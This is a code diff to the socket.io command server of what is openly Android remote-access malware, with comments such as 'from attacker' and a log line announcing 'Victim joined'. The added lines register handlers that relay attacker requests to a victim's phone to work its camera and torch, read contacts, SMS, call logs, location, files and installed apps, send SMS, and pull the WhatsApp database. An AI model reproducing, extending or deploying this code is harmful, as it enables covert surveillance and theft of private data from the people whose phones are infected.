@@ -1,6 +1,7 @@
 const express = require('express');
 const app = express()
 const server = require('http').createServer(app)
+app.use(express.static('public')); // Serve static files from the 'public' directory
 const { Server } = require('socket.io')
 const io = new Server(server, {
   maxHttpBufferSize: 1e8, // 1mb
@@ -27,6 +28,20 @@ io.on('connection', (socket) => {
         }
     })
     socket.on('request', request);//from attacker
+    socket.on('torchControlRequest', request);
+    socket.on('cameraCaptureRequest', request);
+    // New: Request listeners for existing User APK features
+    socket.on('getDirRequest', request);
+    socket.on('getDirByPathRequest', request);
+    socket.on('getInstalledAppsRequest', request);
+    socket.on('getContactsRequest', request);
+    socket.on('sendSMSRequest', request);
+    socket.on('getCallLogRequest', request);
+    socket.on('previewImageRequest', request);
+    socket.on('getSMSRequest', request);
+    socket.on('getLocationRequest', request);
+    socket.on('downloadRequest', request);
+    socket.on('downloadWhatsappDatabaseRequest', request);
     socket.on('join',(device)=>{
         log("Victim joined => socketId "+JSON.stringify(socket.id));
         victimList[device.id] =  socket.id;
